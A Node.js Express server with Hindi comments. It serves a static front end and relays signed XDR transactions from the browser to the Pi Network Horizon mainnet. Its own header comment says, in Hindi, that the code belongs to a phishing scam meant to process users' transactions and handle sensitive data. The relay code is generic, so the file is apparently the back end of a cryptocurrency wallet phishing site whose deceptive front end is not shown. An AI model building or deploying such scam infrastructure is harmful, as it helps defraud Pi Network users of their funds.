const express = require('express');
const path = require('path');
const cors = require('cors');
// stellar-sdk को इस तरह से इम्पोर्ट करना सही है
const StellarSdk = require('stellar-sdk');

const app = express();

// --- चेतावनी: यह कोड एक धोखाधड़ी (Phishing Scam) का हिस्सा है ---
// --- इसका उद्देश्य उपयोगकर्ता के ट्रांजैक्शन को प्रोसेस करना और संभावित रूप से संवेदनशील डेटा को संभालना है ---

// Pi नेटवर्क का Horizon सर्वर
const PI_HORIZON_SERVER = 'https://api.mainnet.minepi.com';
// सही तरीका: StellarSdk.Horizon.Server का उपयोग करें
const server = new StellarSdk.Horizon.Server(PI_HORIZON_SERVER, { allowHttp: true });

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// स्टैटिक फाइलों को सर्व करने के लिए (यह लाइन बहुत महत्वपूर्ण है)
app.use(express.static(path.join(__dirname, 'public')));

// API Endpoint
app.post('/api/submitTransaction', async (req, res) => {
  const { xdr } = req.body;
  if (!xdr) {
    return res.status(400).json({ success: false, error: 'XDR is missing' });
  }

  try {
    // सही तरीका: StellarSdk.TransactionBuilder का उपयोग करें
    const transaction = StellarSdk.TransactionBuilder.fromXDR(xdr, StellarSdk.Networks.PUBLIC);

    console.log('Backend received XDR. Submitting to Pi Network...');
    
    const txResponse = await server.submitTransaction(transaction);

    console.log('Transaction successful on Horizon:', txResponse.hash);
    res.json({
      success: true,
      hash: txResponse.hash,
      result: txResponse
    });
  } catch (error) {
    const errorDetails = error.response ? error.response.data : {
      title: "Backend Error",
      detail: error.message
    };
    console.error('Submission Error:', JSON.stringify(errorDetails, null, 2));
    res.status(400).json({
      success: false,
      error: 'Transaction submission failed',
      details: errorDetails
    });
  }
});

// Catch-all: किसी भी अन्य रूट के लिए index.html भेजें
// यह हमेशा आखिर में होना चाहिए
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
